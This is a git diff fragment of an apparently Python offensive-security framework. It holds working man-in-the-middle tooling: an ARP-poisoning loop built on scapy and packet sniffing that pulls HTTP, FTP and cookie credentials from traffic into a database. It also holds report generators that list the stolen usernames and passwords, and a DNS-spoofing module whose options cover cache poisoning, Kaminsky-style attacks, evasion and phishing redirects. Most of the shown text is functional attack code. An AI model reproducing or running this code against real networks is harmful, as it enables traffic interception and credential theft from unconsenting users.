+            # Confirm attack
+            if config['confirm_targets']:
+                response = input(f"\n{Fore.YELLOW}⚠  Proceed with MITM attack? (yes/no): {Style.RESET_ALL}")
+                if response.lower() not in ['yes', 'y']:
+                    print(f"{Fore.BLUE}ℹ  Attack cancelled{Style.RESET_ALL}")
+                    return
             
-            try:
-                packets = sniff(
-                    iface=config['interface'],
-                    filter=filter_str,
-                    prn=packet_handler,
-                    store=True,
-                    count=config['capture_limit'] if config['capture_limit'] > 0 else 0
-                )
-                
-                if config['save_raw_data']:
-                    wrpcap(config['capture_file'], packets)
-            except Exception as e:
-                print(f"{Fore.RED}✗ Capture error: {str(e)}{Style.RESET_ALL}")
-        
-        capture_thread = threading.Thread(target=capture_packets, daemon=True)
-        capture_thread.start()
-        print(f"{Fore.GREEN}✓ Packet capture started{Style.RESET_ALL}")
-
-
-    def _process_captured_packet(self, packet, config):
-        """Process captured packet for credential extraction"""
-        try:
-            # Extract credentials based on protocol
-            if config['enable_credential_harvest']:
-                if packet.haslayer('TCP'):
-                    payload = bytes(packet['TCP'].payload)
-                    
-                    # HTTP credentials
-                    if config['harvest_http'] and (packet['TCP'].dport == 80 or packet['TCP'].sport == 80):
-                        self._extract_http_credentials(packet, payload, config)
-                    
-                    # FTP credentials
-                    if config['harvest_ftp'] and (packet['TCP'].dport == 21 or packet['TCP'].sport == 21):
-                        self._extract_ftp_credentials(packet, payload, config)
-                    
-                    # SMTP credentials
-                    if config['harvest_smtp'] and (packet['TCP'].dport == 25 or packet['TCP'].sport == 25):
-                        self._extract_smtp_credentials(packet, payload, config)
+            # Initialize database
+            if config['enable_database']:
+                try:
+                    self._initialize_mitm_database(config)
+                    print(f"{Fore.GREEN}✓ Database initialized{Style.RESET_ALL}\n")
+                except Exception as e:
+                    print(f"{Fore.YELLOW}⚠ WARNING: Database init failed - continuing without DB{Style.RESET_ALL}\n")
             
-            # Extract cookies
-            if config['harvest_cookies']:
-                self._extract_cookies(packet, config)
+            # Backup ARP tables
+            if config['backup_arp_tables']:
+                self._backup_arp_tables(config)
             
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-
-
-    def _extract_http_credentials(self, packet, payload, config):
-        """Extract HTTP credentials from packet"""
-        from colorama import Fore, Style
-        try:
-            payload_str = payload.decode('utf-8', errors='ignore')
+            # Enable IP forwarding
+            if config['enable_ip_forward']:
+                self._enable_ip_forwarding()
+                print(f"{Fore.GREEN}✓ IP forwarding enabled{Style.RESET_ALL}")
             
-            # Look for POST data
-            if 'POST' in payload_str:
-                # Extract username/password patterns
-                import re
-                
-                username_patterns = [
-                    r'username=([^&\s]+)',
-                    r'user=([^&\s]+)',
-                    r'login=([^&\s]+)',
-                    r'email=([^&\s]+)'
-                ]
-                
-                password_patterns = [
-                    r'password=([^&\s]+)',
-                    r'pass=([^&\s]+)',
-                    r'pwd=([^&\s]+)'
-                ]
-                
-                username = None
-                password = None
-                
-                for pattern in username_patterns:
-                    match = re.search(pattern, payload_str, re.IGNORECASE)
-                    if match:
-                        username = match.group(1)
-                        break
-                
-                for pattern in password_patterns:
-                    match = re.search(pattern, payload_str, re.IGNORECASE)
-                    if match:
-                        password = match.group(1)
-                        break
-                
-                if username and password:
-                    print(f"\n{Fore.GREEN}[+] HTTP CREDENTIALS FOUND:{Style.RESET_ALL}")
-                    print(f"    Source: {packet['IP'].src}")
-                    print(f"    Username: {username}")
-                    print(f"    Password: {password}\n")
-                    
-                    # Store in database
-                    if config['enable_database']:
-                        self._store_credentials(config, 'HTTP', packet['IP'].src, packet['IP'].dst, username, password)
-        
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-
-
-    def _extract_ftp_credentials(self, packet, payload, config):
-        """Extract FTP credentials"""
-        from colorama import Fore, Style
-        try:
-            payload_str = payload.decode('utf-8', errors='ignore')
+            # Setup signal handlers
+            def signal_handler(sig, frame):
+                print(f"\n\n{Fore.YELLOW}⚠  Interrupt received - cleaning up...{Style.RESET_ALL}\n")
+                self._cleanup_arp_spoof(config)
+                sys.exit(0)
             
-            if 'USER ' in payload_str:
-                username = payload_str.split('USER ')[1].strip()
-                print(f"\n{Fore.GREEN}[+] FTP USERNAME: {username}{Style.RESET_ALL}")
+            signal.signal(signal.SIGINT, signal_handler)
+            signal.signal(signal.SIGTERM, signal_handler)
             
-            if 'PASS ' in payload_str:
-                password = payload_str.split('PASS ')[1].strip()
-                print(f"{Fore.GREEN}[+] FTP PASSWORD: {password}{Style.RESET_ALL}\n")
-                
-                if config['enable_database']:
-                    self._store_credentials(config, 'FTP', packet['IP'].src, packet['IP'].dst, 'ftp_user', password)
-        
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-
-
-    def _extract_smtp_credentials(self, packet, payload, config):
-        """Extract SMTP credentials"""
-        try:
-            payload_str = payload.decode('utf-8', errors='ignore')
-            
-            if 'AUTH LOGIN' in payload_str or 'AUTH PLAIN' in payload_str:
-                # SMTP authentication detected
-                pass
-        
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-
-
-    def _extract_cookies(self, packet, config):
-        """Extract cookies from HTTP traffic"""
-        try:
-            if packet.haslayer('TCP'):
-                payload = bytes(packet['TCP'].payload).decode('utf-8', errors='ignore')
-                
-                if 'Cookie:' in payload:
-                    import re
-                    cookies = re.findall(r'Cookie: (.+)', payload)
-                    if cookies:
-                        # Store cookies
-                        pass
-        
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-
-
-    def _store_credentials(self, config, protocol, source_ip, dest_ip, username, password):
-        """Store credentials in database"""
-        import sqlite3
-        try:
-            conn = sqlite3.connect(config['db_file'])
-            cursor = conn.cursor()
-            
-            cursor.execute('''
-                INSERT INTO credentials (campaign_id, protocol, source_ip, dest_ip, username, password)
-                VALUES (1, ?, ?, ?, ?, ?)
-            ''', (protocol, source_ip, dest_ip, username, password))
-            
-            conn.commit()
-            conn.close()
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-
-
-    def _arp_poison_loop(self, config, target_mac, gateway_mac):
-        """Main ARP poisoning loop"""
-        from scapy.all import ARP, send
-        from colorama import Fore, Style
-        import time
-        import random
-        
-        packet_count = 0
-        start_time = time.time()
-        
-        try:
-            while True:
-                # Poison target
-                arp_target = ARP(op=2, pdst=config['target_ip'], hwdst=target_mac, psrc=config['gateway_ip'])
-                
-                # Poison gateway (bidirectional)
-                if config['mode'] == 'bidirectional':
-                    arp_gateway = ARP(op=2, pdst=config['gateway_ip'], hwdst=gateway_mac, psrc=config['target_ip'])
-                    send(arp_gateway, verbose=False, iface=config['interface'])
-                
-                send(arp_target, verbose=False, iface=config['interface'])
-                
-                packet_count += 2 if config['mode'] == 'bidirectional' else 1
-                
-                # Display progress
-                elapsed = int(time.time() - start_time)
-                print(f"\r{Fore.CYAN}[{elapsed}s] ARP packets sent: {packet_count}{Style.RESET_ALL}", end='', flush=True)
-                
-                # Check auto-stop timer
-                if config['auto_stop_timer'] > 0 and elapsed >= config['auto_stop_timer']:
-                    print(f"\n\n{Fore.YELLOW}⚠  Auto-stop timer reached{Style.RESET_ALL}")
-                    break
-                
-                # Sleep with randomization
-                sleep_time = config['poison_interval']
-                if config['randomize_timing']:
-                    sleep_time += random.uniform(-0.5, 0.5)
-                
-                time.sleep(max(0.1, sleep_time))
-                
-                # Check poison count limit
-                if config['poison_count'] > 0 and packet_count >= config['poison_count']:
-                    print(f"\n\n{Fore.YELLOW}⚠  Poison count limit reached{Style.RESET_ALL}")
-                    break
-        
-        except KeyboardInterrupt as e:
-            # Silently handle KeyboardInterrupt
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] KeyboardInterrupt: {e}")
-        
-        print(f"\n\n{Fore.YELLOW}━━━ STOPPING MITM ATTACK ━━━{Style.RESET_ALL}\n")
-
-
-    def _cleanup_arp_spoof(self, config):
-        """Cleanup and restore network"""
-        from colorama import Fore, Style
-        
-        if config['restore_arp']:
-            print(f"{Fore.CYAN}→ Restoring ARP tables...{Style.RESET_ALL}")
-            self._restore_arp_tables(config)
-            print(f"{Fore.GREEN}✓ ARP tables restored{Style.RESET_ALL}")
-        
-        # Generate final report
-        if config['generate_report']:
-            print(f"{Fore.CYAN}→ Generating final report...{Style.RESET_ALL}")
-            self._generate_mitm_report(config)
-            print(f"{Fore.GREEN}✓ Report generated{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.GREEN}✓ Cleanup completed{Style.RESET_ALL}\n")
-
-
-    def _restore_arp_tables(self, config):
-        """Restore original ARP tables"""
-        from scapy.all import ARP, send
-        import time
-        try:
-            # Get original MACs
+            # Get MAC addresses
+            print(f"{Fore.CYAN}━━━ RESOLVING MAC ADDRESSES ━━━{Style.RESET_ALL}\n")
             target_mac = self._get_mac_address(config['target_ip'], config['interface'])
             gateway_mac = self._get_mac_address(config['gateway_ip'], config['interface'])
             
-            if target_mac and gateway_mac:
-                # Restore target
-                arp_restore_target = ARP(op=2, pdst=config['target_ip'], hwdst=target_mac, 
-                                        psrc=config['gateway_ip'], hwsrc=gateway_mac)
-                
-                # Restore gateway
-                arp_restore_gateway = ARP(op=2, pdst=config['gateway_ip'], hwdst=gateway_mac,
-                                         psrc=config['target_ip'], hwsrc=target_mac)
-                
-                # Send multiple times to ensure restoration
-                for _ in range(5):
-                    send(arp_restore_target, verbose=False, iface=config['interface'])
-                    send(arp_restore_gateway, verbose=False, iface=config['interface'])
-                    time.sleep(0.2)
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-
-
-    def _generate_mitm_report(self, config):
-        """Generate MITM operation report"""
-        import sqlite3
-        from colorama import Fore, Style
-        
-        formats = config['report_format']
-        if formats == 'all':
-            formats = ['txt', 'json', 'html']
-        else:
-            formats = [formats]
-        
-        for fmt in formats:
-            report_file = f"mitm_report_{config['campaign_name']}.{fmt}"
-            
-            if fmt == 'txt':
-                self._generate_mitm_txt_report(config, report_file)
-            elif fmt == 'json':
-                self._generate_mitm_json_report(config, report_file)
-            elif fmt == 'html':
-                self._generate_mitm_html_report(config, report_file)
-
-
-    def _generate_mitm_txt_report(self, config, output_file):
-        """Generate text report"""
-        import sqlite3
-        import time
-        
-        content = f"""ARP SPOOF & MITM OPERATION - FINAL REPORT
-{'=' * 70}
-
-Campaign: {config['campaign_name']}
-Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}
-
-TARGET INFORMATION
-------------------
-Target IP:      {config['target_ip']}
-Gateway IP:     {config['gateway_ip']}
-Interface:      {config['interface']}
-Mode:           {config['mode']}
-
-MITM ATTACKS
-------------
-Packet Capture:         {config['enable_packet_capture']}
-SSL Stripping:          {config['enable_ssl_strip']}
-DNS Spoofing:           {config['enable_dns_spoof']}
-Credential Harvesting:  {config['enable_credential_harvest']}
-
-"""
-        
-        # Get statistics from database
-        if config['enable_database']:
-            try:
-                conn = sqlite3.connect(config['db_file'])
-                cursor = conn.cursor()
-                
-                cursor.execute('SELECT COUNT(*) FROM credentials WHERE campaign_id = 1')
-                cred_count = cursor.fetchone()[0]
-                
-                cursor.execute('SELECT COUNT(*) FROM packets WHERE campaign_id = 1')
-                packet_count = cursor.fetchone()[0]
-                
-                content += f"""STATISTICS
-----------
-Packets Captured:   {packet_count}
-Credentials Found:  {cred_count}
-
-"""
-                
-                # List credentials
-                if cred_count > 0:
-                    content += "CAPTURED CREDENTIALS\n"
-                    content += "-" * 70 + "\n"
-                    
-                    cursor.execute('SELECT protocol, source_ip, username, password, timestamp FROM credentials WHERE campaign_id = 1')
-                    for row in cursor.fetchall():
-                        content += f"\n[{row[4]}] {row[0]}\n"
-                        content += f"  Source: {row[1]}\n"
-                        content += f"  Username: {row[2]}\n"
-                        content += f"  Password: {row[3]}\n"
-                
-                conn.close()
-            except Exception as e:
-                # Silently handle exception - consider logging in production
-                if hasattr(self, "debug") and getattr(self, "debug", False):
-                    print(f"[DEBUG] Exception: {e}")
-        
-        with open(output_file, 'w') as f:
-            f.write(content)
-
-
-    def _generate_mitm_json_report(self, config, output_file):
-        """Generate JSON report"""
-        import json
-        import sqlite3
-        import time
-        
-        report = {
-            'campaign': config['campaign_name'],
-            'timestamp': time.time(),
-            'target': {
-                'ip': config['target_ip'],
-                'gateway': config['gateway_ip'],
-                'interface': config['interface']
-            },
-            'configuration': {
-                'mode': config['mode'],
-                'ssl_strip': config['enable_ssl_strip'],
-                'dns_spoof': config['enable_dns_spoof'],
-                'credential_harvest': config['enable_credential_harvest']
-            },
-            'credentials': [],
-            'statistics': {}
-        }
-        
-        # Get data from database
-        if config['enable_database']:
-            try:
-                conn = sqlite3.connect(config['db_file'])
-                cursor = conn.cursor()
-                
-                cursor.execute('SELECT protocol, source_ip, dest_ip, username, password, timestamp FROM credentials WHERE campaign_id = 1')
-                for row in cursor.fetchall():
-                    report['credentials'].append({
-                        'protocol': row[0],
-                        'source_ip': row[1],
-                        'dest_ip': row[2],
-                        'username': row[3],
-                        'password': row[4],
-                        'timestamp': row[5]
-                    })
-                
-                conn.close()
-            except Exception as e:
-                # Silently handle exception - consider logging in production
-                if hasattr(self, "debug") and getattr(self, "debug", False):
-                    print(f"[DEBUG] Exception: {e}")
-        
-        with open(output_file, 'w') as f:
-            json.dump(report, f, indent=2)
-
-
-    def _generate_mitm_html_report(self, config, output_file):
-        """Generate HTML report"""
-        import time
-        
-        html = f"""<!DOCTYPE html>
-<html>
-<head>
-    <title>MITM Report - {config['campaign_name']}</title>
-    <style>
-        body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
-        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; }}
-        h1 {{ color: #333; border-bottom: 3px solid #e74c3c; padding-bottom: 10px; }}
-        .stats {{ display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin: 20px 0; }}
-        .stat-card {{ background: #f9f9f9; padding: 20px; border-radius: 5px; text-align: center; }}
-        .stat-value {{ font-size: 32px; font-weight: bold; color: #e74c3c; }}
-        .stat-label {{ color: #666; margin-top: 10px; }}
-        .credential {{ background: #fff3cd; padding: 10px; margin: 10px 0; border-left: 4px solid #ffc107; }}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>MITM Operation Report</h1>
-        <p><strong>Campaign:</strong> {config['campaign_name']}</p>
-        <p><strong>Generated:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
-        
-        <h2>Target Information</h2>
-        <table border="1" style="width:100%; border-collapse: collapse;">
-            <tr><td><strong>Target IP</strong></td><td>{config['target_ip']}</td></tr>
-            <tr><td><strong>Gateway IP</strong></td><td>{config['gateway_ip']}</td></tr>
-            <tr><td><strong>Interface</strong></td><td>{config['interface']}</td></tr>
-            <tr><td><strong>Mode</strong></td><td>{config['mode']}</td></tr>
-        </table>
-        
-        <h2>MITM Attacks Enabled</h2>
-        <ul>
-            <li>Packet Capture: {config['enable_packet_capture']}</li>
-            <li>SSL Stripping: {config['enable_ssl_strip']}</li>
-            <li>DNS Spoofing: {config['enable_dns_spoof']}</li>
-            <li>Credential Harvesting: {config['enable_credential_harvest']}</li>
-        </ul>
-    </div>
-</body>
-</html>"""
-        
-        with open(output_file, 'w') as f:
-            f.write(html)
-    
-    def run_dns_spoof(self):
-        """
-        Enterprise DNS Spoofing & Cache Poisoning Platform
-        Main orchestrator for DNS manipulation operations
-        """
-        from colorama import Fore, Style
-        import socket
-        import struct
-        import threading
-        import time
-        
-        print(f"\n{Fore.CYAN}{'=' * 70}")
-        print(f"  DNS SPOOF & CACHE POISONING PLATFORM - ENTERPRISE EDITION")
-        print(f"{'=' * 70}{Style.RESET_ALL}\n")
-        
-        # Check for scapy
-        try:
-            from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, sniff, send, sr1
-            SCAPY_AVAILABLE = True
-        except ImportError:
-            print(f"{Fore.RED}✗ ERROR: Scapy not available{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}ℹ  Install: pip3 install scapy{Style.RESET_ALL}\n")
-            return
-        
-        # Check root privileges
-        import os
-        if os.geteuid() != 0:
-            print(f"{Fore.RED}✗ ERROR: Root privileges required{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}ℹ  Run with: sudo python3 kndys.py{Style.RESET_ALL}\n")
-            return
-        
-        # Load configuration
-        config = self._load_dns_spoof_config()
-        if not config:
-            print(f"{Fore.RED}✗ ERROR: Failed to load configuration{Style.RESET_ALL}")
-            return
-        
-        # Display configuration
-        self._display_dns_spoof_config(config)
-        
-        # Confirm operation
-        if config['confirm_spoof']:
-            response = input(f"\n{Fore.YELLOW}⚠  Proceed with DNS spoofing? (yes/no): {Style.RESET_ALL}")
-            if response.lower() not in ['yes', 'y']:
-                print(f"{Fore.BLUE}ℹ  Operation cancelled{Style.RESET_ALL}")
+            if not target_mac or not gateway_mac:
+                print(f"{Fore.RED}✗ ERROR: Could not resolve MAC addresses{Style.RESET_ALL}")
                 return
-        
-        # Initialize database
-        if config['enable_database']:
+            
+            print(f"{Fore.GREEN}✓ Target MAC:  {target_mac}{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}✓ Gateway MAC: {gateway_mac}{Style.RESET_ALL}\n")
+            
+            # Start packet capture
+            if config['enable_packet_capture']:
+                print(f"{Fore.CYAN}━━━ STARTING PACKET CAPTURE ━━━{Style.RESET_ALL}\n")
+                self._start_packet_capture(config)
+            
+            # Start ARP poisoning
+            print(f"{Fore.CYAN}━━━ STARTING ARP POISONING ━━━{Style.RESET_ALL}\n")
+            print(f"{Fore.YELLOW}→ Mode: {config['mode']}{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}→ Interval: {config['poison_interval']}s{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}→ MITM active - press Ctrl+C to stop{Style.RESET_ALL}\n")
+            
+            # Main attack loop
+            self._arp_poison_loop(config, target_mac, gateway_mac)
+    
+    
+        def _load_arp_spoof_config(self):
+            """Load and validate ARP spoof configuration"""
             try:
-                self._initialize_dns_database(config)
-                print(f"\n{Fore.GREEN}✓ Database initialized{Style.RESET_ALL}")
-            except Exception as e:
-                print(f"\n{Fore.YELLOW}⚠ WARNING: Database init failed - continuing without DB{Style.RESET_ALL}")
-        
-        # Initialize cache
-        if config['enable_cache']:
-            self._initialize_dns_cache(config)
-            print(f"{Fore.GREEN}✓ DNS cache initialized ({config['cache_size']} entries){Style.RESET_ALL}")
-        
-        # Load spoof domains
-        spoof_domains = self._load_spoof_domains(config)
-        if not spoof_domains and not config['wildcard_mode']:
-            print(f"\n{Fore.RED}✗ ERROR: No domains to spoof{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}ℹ  Set 'spoof_domains' or enable 'wildcard_mode'{Style.RESET_ALL}")
-            return
-        
-        print(f"{Fore.GREEN}✓ Loaded {len(spoof_domains)} spoof domains{Style.RESET_ALL}")
-        
-        # Setup signal handlers
-        import signal
-        import sys
-        
-        def signal_handler(sig, frame):
-            print(f"\n\n{Fore.YELLOW}⚠  Interrupt received - cleaning up...{Style.RESET_ALL}\n")
-            self._cleanup_dns_spoof(config)
-            sys.exit(0)
-        
-        signal.signal(signal.SIGINT, signal_handler)
-        signal.signal(signal.SIGTERM, signal_handler)
-        
-        # Start DNS spoofing
-        print(f"\n{Fore.CYAN}━━━ STARTING DNS SPOOFING ━━━{Style.RESET_ALL}\n")
-        print(f"{Fore.YELLOW}→ Interface: {config['interface']}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}→ Spoof IP: {config['spoof_ip']}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}→ Wildcard Mode: {config['wildcard_mode']}{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}→ DNS spoofing active - press Ctrl+C to stop{Style.RESET_ALL}\n")
-        
-        # Main spoofing loop
-        self._dns_spoof_loop(config, spoof_domains)
-
-
-    def _load_dns_spoof_config(self):
-        """Load and validate DNS spoof configuration"""
-        try:
-            config = {
-                # Core
-                'campaign_name': str(self.module_options.get('campaign_name', 'dns_operation')),
-                'interface': str(self.module_options.get('interface', 'eth0')),
-                'listen_port': int(self.module_options.get('listen_port', '53')),
-                'bind_ip': str(self.module_options.get('bind_ip', '0.0.0.0')),
-                'enable_ipv6': self._parse_bool(self.module_options.get('enable_ipv6', 'false')),
-                'protocol': str(self.module_options.get('protocol', 'both')),
-                
-                # Target domains
-                'spoof_domains': str(self.module_options.get('spoof_domains', '')),
-                'spoof_ip': str(self.module_options.get('spoof_ip', '192.168.1.100')),
-                'spoof_ipv6': str(self.module_options.get('spoof_ipv6', '::1')),
-                'wildcard_mode': self._parse_bool(self.module_options.get('wildcard_mode', 'false')),
-                'subdomain_mode': self._parse_bool(self.module_options.get('subdomain_mode', 'false')),
-                'regex_patterns': str(self.module_options.get('regex_patterns', '')),
-                'domain_file': str(self.module_options.get('domain_file', '')),
-                
-                # Response types
-                'response_type': str(self.module_options.get('response_type', 'A')),
-                'ttl': int(self.module_options.get('ttl', '300')),
-                'multiple_ips': str(self.module_options.get('multiple_ips', '')),
-                'cname_target': str(self.module_options.get('cname_target', '')),
-                'mx_priority': int(self.module_options.get('mx_priority', '10')),
-                'txt_record': str(self.module_options.get('txt_record', '')),
-                'ns_server': str(self.module_options.get('ns_server', '')),
-                
-                # Conditional spoofing
-                'source_ip_filter': str(self.module_options.get('source_ip_filter', '')),
-                'exclude_ips': str(self.module_options.get('exclude_ips', '')),
-                'time_based_spoof': self._parse_bool(self.module_options.get('time_based_spoof', 'false')),
-                'spoof_schedule': str(self.module_options.get('spoof_schedule', '')),
-                'query_count_trigger': int(self.module_options.get('query_count_trigger', '0')),
-                'random_spoof': self._parse_bool(self.module_options.get('random_spoof', 'false')),
-                'spoof_probability': int(self.module_options.get('spoof_probability', '100')),
-                
-                # Upstream DNS
-                'upstream_dns': str(self.module_options.get('upstream_dns', '8.8.8.8')),
-                'fallback_dns': str(self.module_options.get('fallback_dns', '1.1.1.1')),
-                'upstream_timeout': int(self.module_options.get('upstream_timeout', '5')),
-                'dns_over_https': self._parse_bool(self.module_options.get('dns_over_https', 'false')),
-                'doh_endpoint': str(self.module_options.get('doh_endpoint', 'https://cloudflare-dns.com/dns-query')),
-                'dns_over_tls': self._parse_bool(self.module_options.get('dns_over_tls', 'false')),
-                'dot_server': str(self.module_options.get('dot_server', '1.1.1.1')),
-                'query_upstream_first': self._parse_bool(self.module_options.get('query_upstream_first', 'true')),
-                
-                # Cache management
-                'enable_cache': self._parse_bool(self.module_options.get('enable_cache', 'true')),
-                'cache_size': int(self.module_options.get('cache_size', '10000')),
-                'cache_ttl': int(self.module_options.get('cache_ttl', '300')),
-                'negative_cache': self._parse_bool(self.module_options.get('negative_cache', 'true')),
-                'negative_cache_ttl': int(self.module_options.get('negative_cache_ttl', '60')),
-                'cache_persistence': self._parse_bool(self.module_options.get('cache_persistence', 'false')),
-                'cache_file': str(self.module_options.get('cache_file', 'dns_cache.json')),
-                'preload_cache': self._parse_bool(self.module_options.get('preload_cache', 'false')),
-                'cache_warmup': self._parse_bool(self.module_options.get('cache_warmup', 'false')),
-                
-                # DNSSEC
-                'strip_dnssec': self._parse_bool(self.module_options.get('strip_dnssec', 'true')),
-                'dnssec_validation': self._parse_bool(self.module_options.get('dnssec_validation', 'false')),
-                'forge_dnssec': self._parse_bool(self.module_options.get('forge_dnssec', 'false')),
-                'ad_flag': self._parse_bool(self.module_options.get('ad_flag', 'false')),
-                
-                # Response manipulation
-                'modify_responses': self._parse_bool(self.module_options.get('modify_responses', 'false')),
-                'inject_additional': self._parse_bool(self.module_options.get('inject_additional', 'false')),
-                'additional_records': str(self.module_options.get('additional_records', '')),
-                'force_recursion': self._parse_bool(self.module_options.get('force_recursion', 'false')),
-                'truncate_responses': self._parse_bool(self.module_options.get('truncate_responses', 'false')),
-                'empty_response': self._parse_bool(self.module_options.get('empty_response', 'false')),
-                'nxdomain_response': self._parse_bool(self.module_options.get('nxdomain_response', 'false')),
-                'servfail_response': self._parse_bool(self.module_options.get('servfail_response', 'false')),
-                
-                # Traffic analysis
-                'log_queries': self._parse_bool(self.module_options.get('log_queries', 'true')),
-                'log_responses': self._parse_bool(self.module_options.get('log_responses', 'true')),
-                'log_spoofed_only': self._parse_bool(self.module_options.get('log_spoofed_only', 'false')),
-                'query_statistics': self._parse_bool(self.module_options.get('query_statistics', 'true')),
-                'track_clients': self._parse_bool(self.module_options.get('track_clients', 'true')),
-                'identify_tools': self._parse_bool(self.module_options.get('identify_tools', 'true')),
-                'detect_tunneling': self._parse_bool(self.module_options.get('detect_tunneling', 'false')),
-                'anomaly_detection': self._parse_bool(self.module_options.get('anomaly_detection', 'false')),
-                
-                # Attack techniques
-                'cache_poisoning': self._parse_bool(self.module_options.get('cache_poisoning', 'false')),
-                'birthday_attack': self._parse_bool(self.module_options.get('birthday_attack', 'false')),
-                'kaminsky_attack': self._parse_bool(self.module_options.get('kaminsky_attack', 'false')),
-                'response_flooding': self._parse_bool(self.module_options.get('response_flooding', 'false')),
-                'query_flooding': self._parse_bool(self.module_options.get('query_flooding', 'false')),
-                'amplification_mode': self._parse_bool(self.module_options.get('amplification_mode', 'false')),
-                'fast_flux': self._parse_bool(self.module_options.get('fast_flux', 'false')),
-                
-                # Evasion & stealth
-                'stealth_mode': self._parse_bool(self.module_options.get('stealth_mode', 'false')),
-                'random_txid': self._parse_bool(self.module_options.get('random_txid', 'true')),
-                'vary_ttl': self._parse_bool(self.module_options.get('vary_ttl', 'false')),
-                'mimic_upstream': self._parse_bool(self.module_options.get('mimic_upstream', 'true')),
-                'delay_responses': self._parse_bool(self.module_options.get('delay_responses', 'false')),
-                'response_delay_ms': int(self.module_options.get('response_delay_ms', '0')),
-                'jitter': self._parse_bool(self.module_options.get('jitter', 'false')),
-                'avoid_detection': self._parse_bool(self.module_options.get('avoid_detection', 'false')),
-                
-                # Integration
-                'mitm_required': self._parse_bool(self.module_options.get('mitm_required', 'true')),
-                'auto_arp_spoof': self._parse_bool(self.module_options.get('auto_arp_spoof', 'false')),
-                'target_gateway': str(self.module_options.get('target_gateway', '')),
-                'phishing_mode': self._parse_bool(self.module_options.get('phishing_mode', 'false')),
-                'redirect_to_server': str(self.module_options.get('redirect_to_server', '')),
-                'clone_legitimate': self._parse_bool(self.module_options.get('clone_legitimate', 'false')),
-                
-                # Filtering
-                'filter_query_types': str(self.module_options.get('filter_query_types', '')),
-                'block_domains': str(self.module_options.get('block_domains', '')),
-                'allow_domains': str(self.module_options.get('allow_domains', '')),
-                'block_tlds': str(self.module_options.get('block_tlds', '')),
-                'geographic_filter': self._parse_bool(self.module_options.get('geographic_filter', 'false')),
-                'asn_filter': str(self.module_options.get('asn_filter', '')),
-                
-                # Database & logging
-                'enable_database': self._parse_bool(self.module_options.get('enable_database', 'true')),
-                'db_file': str(self.module_options.get('db_file', 'dns_spoof.db')),
-                'log_file': str(self.module_options.get('log_file', 'dns_spoof.log')),
-                'log_level': str(self.module_options.get('log_level', 'info')),
-                'log_format': str(self.module_options.get('log_format', 'detailed')),
-                'log_rotation': self._parse_bool(self.module_options.get('log_rotation', 'true')),
-                'max_log_size': int(self.module_options.get('max_log_size', '100')),
-                'pcap_output': str(self.module_options.get('pcap_output', '')),
-                
-                # Performance
-                'threads': int(self.module_options.get('threads', '4')),
-                'queue_size': int(self.module_options.get('queue_size', '1000')),
-                'max_clients': int(self.module_options.get('max_clients', '100')),
-                'rate_limit': int(self.module_options.get('rate_limit', '100')),
-                'burst_limit': int(self.module_options.get('burst_limit', '500')),
-                'connection_timeout': int(self.module_options.get('connection_timeout', '30')),
-                'buffer_size': int(self.module_options.get('buffer_size', '4096')),
-                'async_processing': self._parse_bool(self.module_options.get('async_processing', 'true')),
-                
-                # Reporting
-                'generate_report': self._parse_bool(self.module_options.get('generate_report', 'true')),
-                'report_format': str(self.module_options.get('report_format', 'all')),
-                'report_interval': int(self.module_options.get('report_interval', '60')),
-                'include_statistics': self._parse_bool(self.module_options.get('include_statistics', 'true')),
-                'include_top_domains': self._parse_bool(self.module_options.get('include_top_domains', 'true')),
-                'include_clients': self._parse_bool(self.module_options.get('include_clients', 'true')),
-                'visualize_data': self._parse_bool(self.module_options.get('visualize_data', 'false')),
-                'export_to_splunk': self._parse_bool(self.module_options.get('export_to_splunk', 'false')),
-                
-                # Notifications
-                'enable_alerts': self._parse_bool(self.module_options.get('enable_alerts', 'true')),
-                'alert_on_spoof': self._parse_bool(self.module_options.get('alert_on_spoof', 'true')),
-                'alert_on_cache_poison': self._parse_bool(self.module_options.get('alert_on_cache_poison', 'true')),
-                'alert_on_tunneling': self._parse_bool(self.module_options.get('alert_on_tunneling', 'false')),
-                'alert_method': str(self.module_options.get('alert_method', 'console')),
-                'webhook_url': str(self.module_options.get('webhook_url', '')),
-                'email_to': str(self.module_options.get('email_to', '')),
-                'syslog_server': str(self.module_options.get('syslog_server', '')),
-                
-                # Safety
-                'dry_run': self._parse_bool(self.module_options.get('dry_run', 'false')),
-                'test_mode': self._parse_bool(self.module_options.get('test_mode', 'false')),
-                'interactive': self._parse_bool(self.module_options.get('interactive', 'false')),
